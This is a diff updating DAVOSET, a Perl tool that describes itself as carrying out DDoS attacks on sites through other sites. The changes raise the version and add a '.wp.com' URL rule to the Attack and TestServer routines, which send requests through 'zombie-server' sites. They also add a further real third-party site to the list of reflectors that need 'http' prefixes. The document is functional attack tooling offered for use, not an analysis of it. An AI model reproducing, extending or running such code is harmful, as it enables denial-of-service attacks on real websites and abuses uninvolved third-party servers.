@@ -1,13 +1,13 @@
 #!/usr/bin/perl
 # DDoS attacks via other sites execution tool
-# DAVOSET v.1.3.3
+# DAVOSET v.1.3.4
 # Tool for conducting of DDoS attacks on the sites via other sites
 # Copyright (C) MustLive 2010-2017
-# Last update: 20.05.2017
+# Last update: 22.06.2017
 # http://websecurity.com.ua
 #############################################
 # Settings
-my $version = "1.3.3"; # program version
+my $version = "1.3.4"; # program version
 my $agent = "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1)"; # user agent
 my $default_port = "80"; # default port of the host
 my $show_stat = 1; # show statistic of work
@@ -172,6 +172,7 @@ sub Attack { # send request to zombie-server
 	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap3_proxy.php/);
 	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap2_kmlprxy.php/);
 	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap3_kmlprxy.php/);
+	$site =~ s|^https?://|| if ($url =~ /.wp.com/);
 	$site = "http://$site" if ($site !~ /^https?:/ && CheckURL($url));
 	$site =~ s|://|/| if ($url =~ /proxy2974.my-addr.org/);
 	if ($cache) {
@@ -326,6 +327,7 @@ sub TestServer { # test zombie-server
 	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap3_proxy.php/);
 	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap2_kmlprxy.php/);
 	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap3_kmlprxy.php/);
+	$site =~ s|^https?://|| if ($url =~ /.wp.com/);
 	$site = "http://$site" if ($site !~ /^https?:/ && CheckURL($url));
 	$site =~ s|://|/| if ($url =~ /proxy2974.my-addr.org/);
 	if ($cache) {
@@ -543,6 +545,7 @@ sub CheckURL { # web sites which require "http" for target URL
 	return 1 if ($url =~ m|^http://services.w3.org|);
 	return 1 if ($url =~ m|^http://proxy2974.my-addr.org|);
 	return 1 if ($url =~ m|^http://dacd.win|);
+	return 1 if ($url =~ m|^http://mundoprimaria.com|);
 	return 0;
 }
 
